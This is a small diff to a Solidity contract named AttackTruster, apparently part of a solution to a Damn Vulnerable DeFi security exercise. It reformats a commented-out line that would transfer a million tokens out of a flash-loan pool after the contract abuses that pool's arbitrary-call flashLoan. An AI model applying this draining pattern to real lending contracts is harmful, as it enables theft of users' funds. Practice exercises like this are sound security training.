@@ -18,6 +18,10 @@ contract AttackTruster {
     ) external {
         trust.flashLoan(amount, borrower, target, data);
         // Once approved transfer
-        // damnValuableToken.transferFrom(address(trust), msg.sender, 1000000 ether);
+        // damnValuableToken.transferFrom(
+        //     address(trust),
+        //     msg.sender,
+        //     1000000 ether
+        // );
     }
 }
